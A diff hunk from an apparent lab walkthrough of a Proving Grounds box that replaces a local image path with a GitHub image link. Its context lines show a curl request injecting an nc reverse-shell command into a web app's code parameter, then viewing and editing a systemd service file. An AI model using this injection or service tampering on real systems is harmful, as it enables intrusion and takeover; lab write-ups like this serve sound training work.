@@ -390,7 +390,7 @@ curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.161 18000')" htt
 
 - We type "cat /etc/systemd/system/pythonapp.service" which shows the following.
 
-/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418160552.png
+![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/84929ecd-d675-4284-a8ac-933993b5d646)
 
 - We type "vi /etc/systemd/system/pythonapp.service"
 
